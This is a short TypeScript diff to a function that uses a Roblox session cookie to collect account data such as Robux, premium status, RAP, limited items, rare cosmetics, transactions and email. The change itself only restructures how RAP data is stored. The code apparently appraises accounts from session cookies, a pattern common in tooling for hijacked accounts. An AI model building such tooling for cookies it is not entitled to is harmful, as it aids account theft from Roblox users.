@@ -342,7 +342,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     }
     if (!auth) return null;
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
+    const [robux, premium, headshot, avatar, rapInfo, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -361,6 +361,8 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchOwnedPasses(auth.id),
       fetchEmail(cookieHeader),
     ]);
+    const rap = rapInfo?.total ?? null;
+    const limiteds = rapInfo?.items ?? [];
 
     const createdAt = profile?.created ?? null;
     const accountAgeDays = createdAt
